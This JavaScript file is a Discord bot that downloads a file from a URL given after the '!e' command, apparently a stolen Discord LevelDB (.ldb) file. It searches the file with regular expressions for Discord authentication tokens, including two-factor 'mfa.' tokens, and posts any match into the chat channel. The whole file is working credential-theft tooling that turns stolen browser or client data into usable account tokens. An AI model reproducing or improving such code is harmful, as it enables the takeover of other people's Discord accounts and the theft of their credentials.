import Discord from 'discord.js';
import fs from 'fs';
import download from 'download';
import { TOKEN } from './config.json';

const client = new Discord.Client( { intents: new Discord.Intents(0x7fff) } );

client.on('ready', () => {
    client.user.setActivity(' ldb files', { type: 'LISTENING' });
});

client.on('messageCreate', async message => {
    if (!message.content.startsWith('!e')) return;
    const regex = new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g);
    const regex2fa = new RegExp(/mfa\.[\w-]{84}/g);

    download(message.content.substr(3), process.cwd(), {filename: 'file.ldb'})
    .then( async () => {

        await message.channel.send("File downloaded, attempting to extract token");
        let fdata = fs.readFileSync(`${process.cwd()}/file.ldb`, 'utf-8');
        
        let [match] = regex.exec(fdata) || regex2fa.exec(fdata) || ['No token was found'];
        await message.channel.send('```' +  match.replace(/"/g, '') + '```' );
        
    })
    .catch( async () => {await message.channel.send('There was an error !')});

    if (fs.existsSync(`${process.cwd()}/file.ldb`)) fs.rmSync(`${process.cwd()}/file.ldb`);
    
});


client.login(TOKEN);